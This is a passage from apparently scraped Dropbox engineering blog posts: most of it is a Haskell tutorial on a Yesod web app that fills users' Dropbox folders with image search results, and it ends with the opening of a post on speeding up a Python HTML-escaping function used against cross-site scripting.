ByteString value to an Int32 value. Understanding it is left as an exercise for the reader. Now getting Haskell data into a byte format is as easy as calling toBinary . An important distinction between type classes and the interfaces of C# and Java is that it’s very easy to add new functionality to existing types. In this example, the creators of the both the String and Int32 types didn’t need any foreknowledge of the Binary type class . With interfaces, it would have been necessary to specify the implementation of toBinary and fromBinary at the time those types were defined. It’s also possible to define functions that depend on their arguments or return values being part of a certain type class: Copy packWithLengthHeader :: Binary a => a -> B.ByteString\r\npackWithLengthHeader x = B.append (toBinary $ B.length bin) bin\r\n  where bin = toBinary x Here packWithLengthHeader requires that its input type “ a ” be a part of the Binary type class, this is specified using the “ Binary a => ” context in the type signature. A subtle point in the definition of this function is that it requires the Int type to be a part of the Binary type class as well (the return value of B.length ). Copy > instance Yesod ImageSearch where\r\n>   approot _ = T.pack \"http://localhost:3000\" Yesod requires you to declare a couple of instances for your app type. Most of the definitions in the Yesod type class are optional and have reasonable defaults but it does require you to define approot , the root URL location of your app. This is necessary for Yesod to be able generate URLs. Copy > instance RenderMessage ImageSearch FormMessage where\r\n>   renderMessage _ _ = defaultFormMessage Here’s another instance declaration. The RenderMessage type class in this case is actually based on two types, ImageSearch and FormMessage . It defines a function called renderMessage which takes two arguments and returns defaultFormMessage . Exceptions & Automatic Type Class Derivation Copy > data EitherException = EitherException String\r\n>     deriving (Show, Typeable)\r\n> instance C.Exception EitherException There are multiple ways to specify errors in Haskell. In purely functional contexts it’s not uncommon to see the use of either the Maybe or Either types. In monads based on the IO monad, I usually like to use Haskell exceptions. What’s a monad you say? It’s complicated . Just kidding 🙂 I’ll get to them later. For now, we’re defining a new exception type. It’s the same algebraic datatype declaration you saw earlier for our ImageSearch type except now there’s this “deriving” thing. A Haskell compiler can automatically derive instance declarations for some of the standard type classes. For EitherException we automatically derive instances for the type classes Show and Typeable . As a note, the ability to automatically derive instances for the Typeable type class was enabled by the LANGUAGE pragma DeriveDataTypeable above. The last line declares EitherException to be an instance of C.Exception . It might be weird that we didn’t define any functions for this instance. This is because type classes sometimes provide default implementations for the functions in the class. The C.Exception type class actually provides default implementations for types that are part of the Typeable type class. Monads Copy > exceptOnFailure :: MonadBase IO m => m (Either String v) -> m v\r\n> exceptOnFailure = (>>=either (C.throwIO . EitherException) return) exceptOnFailure is a function that takes a monad that wraps an Either type and returns that same monad except now wrapping the right side of the Either type. This makes sense to me very clearly but I know, o patient reader, that this must look like gibberish to you. First let’s talk about monads. Monads are types within the Monad type class. The Monad type class specifies two functions (or an operator and a function): Copy class Monad m where\r\n  (>>=) :: m a -> (a -> m b) -> m b\r\n  return :: a -> m a The actual Monad type class definition is slightly more complicated but for simplicity’s sake this will do. The first operator “ >>= ” is called bind . What does it do? Well it depends on your monad instance! What we can say for sure is that it takes takes a monad of type “ a ”, a function that maps from “ a ” to a monad of type “ b ”, and returns a monad of type “ b ”. The second function, return , takes a value and wraps it in the monad. What it means to be wrapped in the monad, again, depends on the instance. Please note, the return function isn’t like the return statement in other languages, i.e. it doesn’t short-circuit execution of a monad bind sequence. If that sounds abstract that’s because it is! Monads are a sort of computational framework , many different types of computation are monadic, i.e. they fit the form imposed by bind. Why are monads important? Perhaps the most important reason they exist in Haskell is that they provide a purely functional way to perform (or specify how to perform) IO. Monads are much more than just a way to do IO, however, their general applicability extends to many things. I won’t dwell on monads too much in this post but for the purposes of your immediate understanding, it suffices to explain the IO monad and do notation. Just as I’m not dwelling on monads, you shouldn’t either. It takes a long time to really understand and master what’s going on. The more you program in Haskell, the more it’ll make sense. So why can’t we do IO in Haskell without the IO monad? Haskell is a purely functional language, that means that functions in Haskell mimic their mathematical counterparts. A pure function is a mathematical entity that consistently maps values from one domain to another. You expect cos(0) to always evaluate to 1 , if it ever evaluated to something else something would be very wrong. In a purely functional language how would you define getChar ? Copy getChar :: Char\r\ngetChar = ... It takes no arguments so how can it deterministically return what the user is submitting? The answer is it can’t. You can’t do this in a purely functional language. So what are our options? The answer is to generate a set of actions to take as IO is occurring, in a purely functional manner. This is what the IO monad is and this is why values in the IO monad are called IO Actions . It’s a form of metaprogramming. Here’s an IO action that prints “yes” if a user types “y” and “no” otherwise: Copy -- type signatures\r\nprint :: Show a => a -> IO ()\r\ngetChar :: IO Char\r\n\r\nmain :: IO ()\r\nmain = getChar >>= (x -> print $ if x == 'y' then \"yes\" else \"no\") Why does this work? Notice how the “output” of getChar isn’t tied to its own value, instead the bind operation gets the output value for us. We’re using monads here to build and model sequential and stateful computation, in a purely functional way! You can imagine that writing real programs in the IO monad could get ugly if you used “ >>= ” and lambdas everywhere so that’s why Haskell has some syntactic sugar for writing out complex monadic values. This is called do notation. Here’s the same IO action from above written in do notation. Copy main = do\r\n  x <- getChar\r\n  print $ if x == 'y'\r\n          then \"yes\"\r\n          else \"no\" In do notation each monad is bound using bind in order and values are pulled out using the left-pointing arrow “ <- ”. We’re coming to the close of yet another Haskell monad explanation but before we finish I really want to emphasize that monads and the IO monad in particular aren’t that special. Here’s my very own implementation of the IO monad: Copy data MyIO a = PrimIO a | forall b. CompIO (MyIO b) (b -> (MyIO a))\r\n\r\nmyGetChar :: MyIO Char\r\nmyGetChar = PrimIO 'a'\r\n\r\nmyPrint :: Show a => a -> MyIO ()\r\nmyPrint s = PrimIO ()\r\n\r\ninstance Monad MyIO where\r\n  m >>= f = CompIO m f\r\n  return x = PrimIO x\r\n\r\nrunMyIO :: MyIO m -> m\r\nrunMyIO (PrimIO x) = x\r\nrunMyIO (CompIO m f) = runMyIO (f (runMyIO m)) Of course in the real IO monad, getChar isn’t hard-coded to return the same thing each time and print actually prints something on your terminal. IO actions are run by your Haskell runtime which is usually written in a language where you can actually call a non-pure getChar function, like C. Either Type Now, back to exceptOnFailure . Let’s look at it again: Copy exceptOnFailure :: MonadBase IO m => m (Either String v) -> m v\r\nexceptOnFailure = (>>=either (C.throwIO . EitherException) return) Is it still confusing? 🙂 Remember how I said earlier that the Either datatype was used to denote errors in Haskell? The definition of Either looks like this: Copy data Either a b = Left a | Right b\r\n\r\neither :: (a -> c) -> (b -> c) -> Either a b -> c\r\neither f _ (Left x) = f x\r\neither _ g (Right x) = g x You can use the either function to return different values depending on the Either datatype passed in. By convention the Left constructor is used to denote an error value. For exceptOnFailure , first we create a function that takes an Either value and if it’s a failure we throw an exception using C.throwIO otherwise we call return to rewrap the success value. Then we curry in that function to the right side of the “ >>= ” operator. Some Utility Functions Copy > myAuthStart :: DB.Config -> Maybe DB.URL -> IO (DB.RequestToken, DB.URL)\r\n> myAuthStart config murl = exceptOnFailure $ DB.withManager $ mgr ->\r\n>   DB.authStart mgr config murl\r\n> \r\n> myAuthFinish :: DB.Config -> DB.RequestToken -> IO (DB.AccessToken, String)\r\n> myAuthFinish config rt = exceptOnFailure $ DB.withManager $ mgr ->\r\n>   DB.authFinish mgr config rt\r\n> \r\n> myMetadata :: DB.Session -> DB.Path -> Maybe Integer\r\n>               -> IO (DB.Meta, Maybe DB.FolderContents)\r\n> myMetadata s p m = exceptOnFailure $ DB.withManager $ mgr ->\r\n>   DB.getMetadataWithChildren mgr s p m Here I’ve defined a couple of convenience functions for using the Dropbox SDK. This is just so I don’t have to use DB.withManager every time I call these functions. Also all of the vanilla Dropbox SDK functions return an Either value in the IO monad so we make use of exceptOnFailure to automatically throw an exception for us if something goes wrong. Copy > tryAll :: MonadBaseControl IO m => m a -> m (Either C.SomeException a)\r\n> tryAll = C.try C.try is the normal way to catch exceptions in Haskell. Unfortunately it uses ad-hoc polymorphism within the Exception type class to determine which exception it catches. Since tryAll has an explicit type signature, it’s bound to the instance of C.try that catches C.SomeException . Copy > dbRequestTokenSessionKey :: T.Text\r\n> dbRequestTokenSessionKey = T.pack \"db_request_token\" This is a constant I use for the name of my session key that stores the OAuth request token when authenticating the user to my API app but more on that later. The Dropbox API Authentication Process The Dropbox API uses OAuth to grant apps access to Dropbox user accounts. To access any of the HTTP endpoints of the Dropbox API an app must provide an access token as part of the HTTP request. Access tokens are revokable long-lived per-user per-app tokens that are granted to an app at the request of a user. Acquiring an access token is a three step process: The app must obtain a unauthenticated request token via the Dropbox API. The app redirects the user to the Dropbox website . Once the user is at the Dropbox website the user can either approve or deny the request to authenticate the request token for the app. The Dropbox website redirects the user back to the app’s website. The app can then exchange the authenticated request token for an access token . A request token actually consists of two components, a key and a secret. Only the key component should be exposed in plaintext. To ensure proper security, the secret should only ever be known to the Dropbox servers and the API app attempting authentication. To exchange an authenticated request token for an access token, the app must also provide the original secret of the request token. This prevents third-parties from hijacking authenticated request tokens. An access token is long-lived but at any point in time can become invalid. When an access token becomes invalid it is the responsibility of the API app to go through the authentication process again. This allows Dropbox and its users to revoke access tokens at will. Initiating the Authentication Process Copy > getHomeR :: Handler RepHtml\r\n> getHomeR = do Users can enable our app for their Dropbox account using the web. Yesod is the web framework we are using to implement web pages in Haskell. In Yesod all HTTP routes are values in the Handler monad. The convention is that the handler name is the combination of the HTTP method (GET in this case) and the name of the resource. getHomeR is the handler for the GET method on the “HomeR” resource which is located at root HTTP path, “/”. Handlers are connected to HTTP routes served by the web server via the use of Template Haskell above. The Handler monad is essentially a decorated IO monad so don’t worry about what it is that much. You should use it just like you would use the IO monad. Copy >   ImageSearch _ dbConfig <- getYesod getYesod retrieves the app’s value. In our app this value has the ImageSearch type that we defined at the very beginning. Here we’re deconstructing the ImageSearch value and extracting only the config component (while ignoring the channel component). The config value stores some information about our app, like app key and locale, that is used by the Dropbox SDK. Copy >   myRender <- getUrlRender getUrlRender gets the URL render function for your app. It turns a resource value for your app into a Text URL. Copy >   (requestToken, authUrl) <- liftIO\r\n>                              $ myAuthStart dbConfig\r\n>                              $ Just $ T.unpack $ myRender DbRedirectR Here we call the DB.authStart function (by way of myAuthStart ). This function performs the first step of the Dropbox API authentication process. We pass in the URL, DbRedirectR , that we want the user to be redirected to after they authenticate and we get back our new unauthenticated request token and the Dropbox URL where the user can authenticate it. Note that T.unpack converts a Text value into a String value. The myAuthStart function is in the IO monad so we make use of liftIO to execute myAuthStart in the Handler monad. Since Handler is a wrapper around the IO monad, the liftIO function “lifts” the IO action into the higher monad. Copy >   let DB.RequestToken ky scrt = requestToken Do notation allows you to bind names using “let” in a do block. This is for when you need to assign a name to a value that isn’t coming from a monad. Here we’re deconstructing the request token from myAuthStart to get the key and the secret. Copy >   setSession dbRequestTokenSessionKey $ T.pack $ ky ++ \"|\" ++ scrt A session in Yesod is a set of key-value pairs that is preserved per browsing session with our web site. It’s implemented using encryption on top of HTTP cookies. We store the key and the secret of the request token in the session using setSession . We’ll need the secret to finish the authentication process after the user authenticates our app. setSession expects two Text values so we use T.pack to turn the second argument from a String type into a Text type. Copy >   redirectText RedirectTemporary $ T.pack authUrl Finally we redirect the user to the URL given to us from myAuthStart , authUrl . Dropbox will ask the user if they want to allow our app to have access to their account. After they respond, Dropbox will authenticate the request token and then redirect the user to the URL passed to the call to myAuthStart above. Applicative Functors Copy > getDropboxQueryArgs :: Handler (T.Text, T.Text)\r\n> getDropboxQueryArgs = runInputGet $ (,)\r\n>                       <$> ireq textField (T.pack \"oauth_token\")\r\n>                       <*> ireq textField (T.pack \"uid\") When Dropbox redirects the user back to our site it passes along some query args in the GET request: “oauth_token” and “uid”. Yesod provides a convenient way, using runInputGet , to extract those in the handler. The (,) operator is a special prefix-only operator that creates pairs for us: Copy (,) x y = (x, y) You might be wondering what “ <$> ” and “ <*> ” are. Relax, these are regular operators. They are used for applicative functors . Applicative functors are kind of like monads except not as powerful. I’m going to do something horrible here and define “ <$> ” and “ <*> ” in monad terms: Copy (<*>) :: Monad m => m (a -> b) -> m a -> m b\r\nmf <*> m = do\r\n  f <- mf\r\n  x <- m\r\n  return $ f x\r\n\r\n(<$>) :: Monad m => (a -> b) -> m a -> m b\r\nf <$> m = return f <*> m If you pretend that bind, “ >>= ”, doesn’t exist and you only have “ <*> ” and return defined for your type, then your type isn’t a monad, it’s an applicative functor. The only exception is that return is instead called pure in the applicative functor type class: Copy class Applicative f where\r\n  pure  :: a -> f a\r\n  (<*>) :: f (a -> b) -> f a -> f b The actual Applicative type class definition is slightly more complicated but for simplicity’s sake this is good enough. Now let’s put it all together, in our definition of getDropboxQueryArgs we apply (,) in the applicative functor, then pass the resulting value to runInputGet . runInputGet then runs the applicative functor in the Handler monad. I know it sounds crazy, I know it does, but luckily you don’t have to fully understand what’s going on behind the scenes to understand how it’s supposed to behave. Keep writing and reading Haskell and eventually it’ll make a lot of sense. Trust me, if I can understand this stuff you can too. The Authentication Result Handler Copy > getDbRedirectR :: Handler RepHtml\r\n> getDbRedirectR = do This is the handler for the location of the redirect in the app authentication process. After the user has given our app access to their account they are redirected here. Copy >   mtoken <- lookupSession dbRequestTokenSessionKey Remember how before we redirected the user to the Dropbox authentication URL we first set a key-value pair in the Yesod session using setSession ? After the user is redirected, we use the lookupSession function to get the token back out. lookupSession returns a Maybe value so that if a key-value pair does not exist in the current session it can return Nothing , otherwise it will return the value wrapped in the Just constructor. Copy >   let noCookieResponse = defaultLayout [whamlet|\r\n> cookies seem to be disable for your browser! to use this\r\n> app you have to enable cookies.|]\r\n> \r\n>   when (isNothing mtoken) $ noCookieResponse >>= sendResponse when is a nice function courtesy of Control.Monad that runs the second argument, a value in some monad, only if the first argument is true. It’s defined like this: Copy when :: Monad m => Bool -> m () -> m ()\r\n  when p m = if p then m else return () If mtoken is bound to a Nothing value we’ll return an error message to the user asking them to enable cookies and discontinue normal execution by using sendResponse . After the isNothing check we are guaranteed that mtoken is bound to a Just value. Copy >   let rt@(sessionTokenKey:_) = T.splitOn (T.pack \"|\")\r\n>                                $ fromJust mtoken We extract the token from mtoken using fromJust and pass that along to T.splitOn . T.splitOn will split a Text value into a list of Text values using the input argument (“|” in this case) as the delimiter. Then we use the “ @ ” syntax to simultaneously bind the result to the rt name and deconstruct the first element of the result into the sessionTokenKey name. Copy >   (getTokenKey, _) <- getDropboxQueryArgs\r\n>   when (getTokenKey /= sessionTokenKey)\r\n>     $ invalidArgs [T.pack \"oauth_token\"] To get the request token key that the user authenticated at the Dropbox website we use getDropboxQueryArgs . Checking this key against the request token key that we stored in the session helps prevent request forgery . If the keys don’t match we stop execution of this handler by calling invalidArgs . “ /= ” is the not equals operator, like “ != ” in other languages. We do this verification because we want to prevent other sites from successfully coercing a user into invoking this handler. We only want the Dropbox website to invoke this handler. Copy >   let requestToken = uncurry DB.RequestToken\r\n>                      $ listToPair $ map T.unpack rt Here’s listToPair in action! Since it returns a tuple we use this nifty built-in function called uncurry : Copy uncurry f (x, y) = f x y Using uncurry and listToPair , we pass the DB.RequestToken constructor the request token key and secret that we stored in the session. Since rt contains two Text values we use “ map T.unpack ” to convert them into two String values. Copy >   ImageSearch chan dbConfig <- getYesod\r\n>   accessToken <- liftIO $ myAuthFinish dbConfig requestToken Now we can finish up the authentication process and get our access token. We pass in the authenticated request token to DB.authFinish (by way of myAuthFinish ) and if everything is successful we obtain the access token. Copy >   liftIO $ writeChan chan accessToken In this app we make use of Concurrent Haskell . This allows us to create multiple independent threads of control in the IO monad. There are logically two main concurrently running threads in this app, the web server thread where all of our handler code is run, and the thread that is updating the Dropbox accounts of the users of our app with the relevant search results. We’ll talk about our use of threads a lot more later. Channels are a mechanism for typed inter-thread communication in Haskell. We use the channel component of our app value to send over the access token so that we can begin the updating process for this user’s Dropbox account. Copy >   defaultLayout [whamlet|okay you are hooked up!|] Finally, we send a success message to the user’s browser indicating they have linked their account to our app. Arrows We’ve gone over monads and we’ve gone over their weaker counterparts, applicative functors. Arrows are another pattern you’ll likely see used in Haskell code. They commonly serve as a general framework for representing and combining operations that convert input to output, kind of like filters. Arrows, like monads and applicative functors, are actually types and arrow types are instances of the Arrow type class: Copy class Arrow a where\r\n  arr :: (b -> c) -> a b c\r\n  (>>>) :: a b c -> a c d -> a b d\r\n  first :: a b c -> a (b, d) (c, d) The actual Arrow type class definition is slightly more complicated but for simplicity’s sake this will do just fine 🙂 Given my analogy to filters you might think that regular Haskell functions resemble arrows and you’d be right. Arrows are generalizations of regular Haskell functions and functions are, in fact, defined as instances of the Arrow type class: Copy instance Arrow (->) where\r\n  arr f = f\r\n  f >>> g = g . f\r\n  first f (x, y) = (f x, y) To understand this instance declaration it’s important to note that the arrow symbol, “ -> ”, is an operator in the Haskell type language. Just like normal operators, operators in the type language also have prefix forms, e.g. “ (->) a a ” is the same type as “ a -> a .” In “ instance Arrow (->) ”, we turned the “ -> ” operator into its prefix form and used that to define the Arrow instance for functions. In Haskell, the “ -> ” operator in the type language is actually a type constructor, i.e. when you apply it to two types it creates a new type, a function of those two types. Copy > selectImageUrls :: ArrowXml a => a XmlTree String\r\n> selectImageUrls = deep (isElem\r\n>                         >>>\r\n>                         hasName \"a\"\r\n>                         >>>\r\n>                         hasAttr \"href\"\r\n>                         >>>\r\n>                         getAttrValue \"href\"\r\n>                         >>>\r\n>                         isA isImgUrl\r\n>                        )\r\n>   where isImgUrl = DL.isInfixOf \"imgurl=\" It’s common to use the Arrow type class as a basis for combinator libraries; libraries that allow you to combine domain-specific functions in intuitive ways to create new functions. HXT is one such combinator library, it’s a library for manipulating XML documents. In our app we define an arrow, selectImageUrls , that takes an XML document, denoted by the XmlTree type, and extracts all of the links that contain the string “imgurl=”. These are links in the image search result page that contain the URLs to the found image files. Thread Architecture Above I wrote that there were two main threads of execution in this app: the thread that served out HTTP requests for our web front-end and the thread that implemented the image search functionality in our user’s Dropboxes. For the latter part, there are actually many threads. There is one thread that is listening on the Haskell channel for new users linking our app to their accounts from the web server thread. There is a thread per user account that polls the user’s Dropbox account every 30 seconds and waits for new folders for it to populate with images. There is also a thread per new folder per user account that is responsible for populating a specific folder with the images found during the image search. In other languages like C, C++, Java, or Python this unbounded use of threads wouldn’t be very efficient since threads in those languages often map 1:1 to kernel-level threads. Normally you can’t depend on kernel-level threads scaling into the tens of thousands. In Haskell (or at least in modern versions of GHC) threads are relatively cheap and the runtime does a good job of distributing many Haskell threads across a bounded number of kernel-level threads, usually one per CPU. Image Uploading Thread Copy > handleFolder :: DB.Session -> String -> IO ()\r\n> handleFolder session filePath = do handleFolder is the thread that is responsible for populating a specific folder in a user’s Dropbox with the image search results. Copy >   let searchTerm = takeFileName filePath We use the file name portion of the folder path as the search term. Copy >       src__ = \"http://www.yourfavoritesearchengine.com/\"\r\n>       src_ = src__ ++ \"search?tbm=isch&tbs=sur:f&\"\r\n>       src  = src_ ++ (URL.export $ URL.importList [(\"q\", searchTerm)]) src is the generated full image search URL. We use the URLEncoded library to generate a properly escaped URL query string. Copy >   imageSearchResponse_ <- simpleHttp src\r\n>   let imageSearchResponse = T.unpack\r\n>                             $ decodeUtf8With ignore\r\n>                             $ toStrict imageSearchResponse_ Here we fetch the image search result page using simpleHttp . simpleHttp returns a lazy ByteString type but our XML library requires a String type so we have to convert between the two using a combination of T.unpack , decodeUtf8With , and toStrict . Copy >   images <- runX ( readString [ withParseHTML yes\r\n>                               , withWarnings no\r\n>                               ] imageSearchResponse\r\n>                    >>>\r\n>                    selectImageUrls\r\n>                  ) Here we make use of the HXT XML processing library to parse out all the relevant image search URLs from the HTML document returned from the search query. Notice the use of the selectImageUrls arrow defined earlier. images is of type [String] . Copy >   forM_ images $ url -> tryAll $ do forM_ executes a monad for each element in its list argument. The second argument is a function that takes an element from the input list and returns the corresponding monadic value. Using forM_ we’re performing an IO action for each image URL we parsed out of the result page to ultimately upload that image into the user’s Dropbox. We wrap the monad expression in a tryAll to prevent an exception in the processing of any single element from stopping the entire process. Copy >     urlenc <- URL.importURI $ fromJust $ URI.parseURIReference url\r\n>     let imgUrl = fromJust $ URL.lookup (\"imgurl\" :: String) urlenc\r\n>         imgUrlURI = fromJust $ URI.parseURIReference imgUrl\r\n>         imgName = takeFileName $ URI.uriPath imgUrlURI\r\n>         dropboxImgPath = combine filePath imgName Each of the URLs that were parsed out of the HTML contain the source URLs of the images in an embedded query arg, “imgurl”. In this code snippet we extract the actual source URL of the image, imgUrl , from the “imgurl” query arg and we generate the path into the user’s Dropbox where we want to place the image, dropboxImgPath . Copy >     image <- simpleHttp imgUrl simpleHttp performs an HTTP request to the location of the source image and returns the response body in a lazy ByteString . Copy >     DB.withManager $ mgr ->\r\n>       DB.addFile mgr session dropboxImgPath\r\n>       $ DB.bsRequestBody $ toStrict image This is the call to the Dropbox SDK that allows us to upload a file. We upload the file data, image , to the path we generated earlier, dropboxImgPath . If a file already exists at that path, DB.addFile won’t overwrite it. New Folder Detection Thread Copy > handleUser :: Chan DB.AccessToken\r\n>               -> DB.Config\r\n>               -> DB.AccessToken -> [String] -> IO ()\r\n> handleUser chan dbConfig accessToken_ foldersExplored = do handleUser is the thread that runs for each user that is linked to our API app. It monitors the user’s Dropbox for new folders that we should populate with search results. It polls the user’s Dropbox every 30 seconds and loops forever. While this thread is running it’s possible for the handleNewUsers thread to send us a new access token to use through the channel given by the chan argument. Copy >   accessToken <- let getCurrentAccessToken x = do\r\n>                        emp <- isEmptyChan chan\r\n>                        if emp\r\n>                          then return x\r\n>                          else readChan chan >>= getCurrentAccessToken\r\n>                  in getCurrentAccessToken accessToken_ I use the “ let ... in ... ” syntax to privately define the getCurrentAccessToken function. This function repeatedly polls the access token channel using isEmptyChan until it’s empty at which point it returns the last access token that was pulled off the channel. Copy >   efolders <- tryAll $ do We wrap all the IO actions in this run of handleUser just in case a transient exception occurs. Copy >     let session = DB.Session dbConfig accessToken session is the name bound to the DB.Session value that the Dropbox SDK interface needs to upload file data into a user’s Dropbox. Copy >     metadata <- myMetadata session \"/\" Nothing We make use of myMetadata to get a collection of all the children inside the root of our API app sandbox, “/”. Copy >     let (_, Just (DB.FolderContents _ children)) = metadata\r\n>         folders = mapMaybe ((DB.Meta base extra) ->\r\n>                              case extra of\r\n>                                DB.Folder -> Just $ DB.metaPath base\r\n>                                _ -> Nothing) children\r\n>         newFolders = folders DL. foldersExplored This snippet of code extracts out the list of new Dropbox paths that we should be populate with image search results. mapMaybe is a combination of map and filter . Any element that the input function returns Nothing for is filtered out of the returned list. Elements that the function returns a Just value for are included in the output list without the Just wrapper. We use it here to return all the paths in the “/” folder that are folders and we exclude children that are plain files. The “ DL. ” operator returns all the elements in the first list operand that aren’t included in the second list operand, it’s like a set difference operation. Copy >     forM_ newFolders (forkIO . handleFolder session) Here we use the forM_ function again. This time we spawn off a new thread using forkIO for each new folder we found in the app’s sandbox folder. Copy >     return folders We need to give our parent IO action access to the new list of paths in the sandbox folder so it can keep track of what paths are new. Copy >   threadDelay $ 30 * 1000 * 1000 threadDelay is like sleep() in other languages; It pauses execution for 30 seconds. Copy >   let curFolders = either (const []) id efolders If an error occurred while polling the user’s account for new folders we bind an empty list to curFolders , otherwise we bind the current list of folders to curFolders . Copy >   handleUser chan dbConfig accessToken\r\n>     $ curFolders `DL.union` foldersExplored After sleeping for 30 seconds we loop by recursing. This is the common way in Haskell to loop in a monad. Before we recurse here we update the total lists of folders we’ve ever seen so that we don’t attempt to update them again. New App User Thread Copy > handleNewUsers :: ImageSearch\r\n>                   -> Map.Map String (Chan DB.AccessToken)\r\n>                   -> IO ()\r\n> handleNewUsers app_@(ImageSearch chan dbConfig) map_ = do handleNewUsers is the thread that is listening for newly linked users to our API app via the channel and spawns off a handleUser thread for each new user. We make use of the “ @ ” syntax again to simultaneously bind the ImageSearch argument to the app_ name and deconstruct it into its chan and dbConfig components. The map_ argument keeps a mapping from user ID to the channel of the thread that is handling that user ID. We need that so we can update the access token a thread is using if it is revoked. Copy >   (accessToken, userId) <- readChan chan readChan gets a value off the channel shared between this thread and the web server thread. Each value is a tuple that contains a user ID and an access token for that user ID. Copy >   newMap <- case Map.lookup userId map_ of\r\n>     Just atChan -> do\r\n>       writeChan atChan accessToken\r\n>       return map_\r\n>     Nothing     -> do\r\n>       nChan <- newChan\r\n>       _ <- forkIO $ handleUser nChan dbConfig accessToken []\r\n>       return $ Map.insert userId nChan map_ We look up the user ID we were given in our map of thread channels. If we have a thread handling the account of user ID we got, we send it the new access token by writing to its channel. If we don’t have a thread handling this specific user account then we create a new channel, spawn off a new handleUser thread, and update our channel map. Copy >   handleNewUsers app_ newMap Finally we loop with the new map. Main Program Entry Point Copy > main :: IO ()\r\n> main = do So it’s been a long and arduous path but finally we arrive at that main IO action. The main IO action kicks off execution for every Haskell program just like in C/C++ and Java. Copy >   let defaultAppKey = undefined :: String\r\n>       defaultAppSecret = undefined :: String\r\n>       defaultAppType = undefined :: DB.AccessType Here are the default credentials for the app. We use the Haskell value undefined , otherwise known as _|_ . This is a polymorphic constant that you can use anywhere in Haskell, it can be of any type. An exception will be thrown if an undefined value is ever evaluated in your Haskell program. To get this app to work you will need to supply your own values for these constants. In theory these should be parsed out of the command line or a configuration file but for the purposes of this demo app we define them inline here. Copy >   chan <- newChan Create the inter-thread communication channel using newChan . Copy >   dbConfig <- DB.mkConfig\r\n>               DB.localeEn\r\n>               defaultAppKey\r\n>               defaultAppSecret\r\n>               defaultAppType\r\n>   let app_ = ImageSearch chan dbConfig Create our application specific ImageSearch value. It contains both the channel and a DB.Config value. Copy >   _ <- forkIO $ handleNewUsers app_ Map.empty Kick off the handleNewUsers thread that accepts new users to our app. Copy >   warpDebug 3000 app_ And finally, call warpDebug which kicks off our Yesod web interface. Conclusion That’s it. That’s our Dropbox API app in Haskell. If you were a newcomer to Haskell this would be a healthy time to have tons of questions. Actually if I’ve done my job right you should be very curious to know more about Haskell 🙂 Head on over to HaskellWiki and start your journey. If you want a nice friendly book to help you get more formally acquainted I can recommend both “ Real World Haskell ” and “ Learn You a Haskell for Great Good ”. One piece of advice for your new Haskell journey: don’t sweat the monads . As for our API app, it’s actually not finished yet. One huge thing missing is that it doesn’t remember which users linked to our app and what folders we’ve populated across restarts, we’d need to store that data in some kind of persistent database to fix that. Another pain point is the user has to wait 30 seconds in the worst case for their folders to be populated with images. This is because each of our handleUser threads poll the Dropbox API every 30 seconds. While this is bad from a user experience perspective it’s also bad from an engineering perspective. This will cause the load we induce on the Dropbox API to increase linearly with the number of users using our app, we’d instead like it to increase linearly with the number of active users using our app. Currently there’s no way to get around this issue but we’re working on it! Other minor improvements include picking a better algorithm to decide which folders we populate with photos, better HTML for our web interface, and streaming uploads to the Dropbox API. I’m sure there are more. As an exercise, consider fixing some of these problems, remember you can fork this project on GitHub. By the way our Haskell SDK is also on GitHub, you may need to fork that too. If you have any questions, feel free to reach out. My email is rian+dropbox+com. Have fun ! Many thanks to Kannan Goundan, Brian Smith, Dan Wheeler, ChenLi Wang, Martin Baker, Tony Grue, Ramsey Homsany, Bart Volkmer, Jie Tang, Chris Varenhorst, and Scott Loganbill for their help in reviewing this post. Also special thanks to Michael Snoyman for creating Yesod and accepting my patches. Lastly, a huge thanks to all those who have researched and pushed Haskell forward throughout the years. // Tags Application Python Developer haskell // Copy link Link copied Link copied", "date": "2012-01-02"},
{"website": "Dropbox", "title": "A Python Optimization Anecdote", "author": ["Pavel Panchekha"], "link": "https://dropbox.tech/application/a-python-optimization-anecdote", "abstract": "Hi! I'm Pavel and I interned at Dropbox over the past summer. One of my biggest projects during this internship was optimizing Python for dynamic page generation on the website. By the end of the summer, I optimized many of dropbox.com's pages to render 5 times faster. This came with a fair share of challenges though, which I'd like to write about today: The Problem Dropbox is a large website with lots of dynamically generated pages. The more pages that are dynamically generated from user input, the bigger the risk becomes for Cross-site scripting attacks. To prevent this, we must ensure to escape all dynamically generated text before it gets sent to the browser. Note that we also need to escape things differently in different string contexts such JavaScript code, HTML text, and HTML attributes. This is because an abusive user-generated string placed in JavaScript may not be abusive if placed in HTML and vice-versa. All user-generated strings on the Dropbox website are passed through a special escaping function we've written that takes context into account. The problem is that having defined our own escaping function we need to ensure that it's as fast as possible since basically all user input is passing through this function. In this article we'll focus on one particular escaping context, HTML text. A quick disclaimer, before you accuse us of reinventing the wheel and ignoring both the xml.sax.saxutils.escape and cgi.escape functions, it doesn't escape quite enough characters. This is especially true if you consider the possibility for confusing the browser into believing your page is UTF-7, at which point the equal sign has to be escaped. So we have to write our own. First steps The original function looked like this: Copy WHITELIST = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\"\r\n  \r\ndef escape_engine(s, on_whitelist, on_ascii, on_unicode):\r\n    pieces = []\r\n    for char in s:\r\n        if char in WHITELIST:\r\n            pieces.append(on_whitelist(char))\r\n        elif ord(char) < 256:\r\n            pieces.append(on_ascii(char))\r\n        else:\r\n            pieces.append(on_unicode(char))\r\n    return \"\".join(pieces)\r\n  \r\ndef html1(s):\r\n    \"\"\"\r\n   Escapes a string for inclusion into tag contents in HTML.\r\n  \r\n   Do *not* use for including a string into an HTML attribute; use\r\n   escape.attr() for that.\r\n   \"\"\"\r\n  \r\n    # Ensure we deal with strings\r\n    s = unicode(s)\r\n  \r\n    escaped = escape_engine(s,\r\n        on_whitelist = lambda c: c,\r\n        on_ascii = lambda c: \"&#%02x;\" % ord(c),\r\n        on_unicode = lambda c: \"&#%02x;\" % ord(c),\r\n    )\r\n  \r\n    return UNSAFE_bless(escaped) # Now it’s escaped, so should be safe Applying it to some test templates gives (times in seconds; the digits (obviously) aren't all significant): : html1 14.1678471565 Not very fast. (I blame the intern who wrote it...) Of course, the code wasn't optimized for speed, but for readability. But like I said, given that this is actually a non-negligible part of our render time, it could use some optimization. Inlining The first fact of Python optimization is that function calls are slow. html1 is awful in this regard: it calls a function per character! Worse yet, the common case is calling a function that does nothing at all! So the first step is to inline. This also lets us join the on_ascii and on_unicode cases (originally separated because we also use the above for escaping JavaScript, where we do make a distinction between Unicode and ASCII literals). Copy def html2(s):\r\n    \"\"\"\r\n   Escapes a string for inclusion into tag contents in HTML.\r\n  \r\n   Do *not* use for including a string into an HTML attribute; use\r\n   escape.attr() for 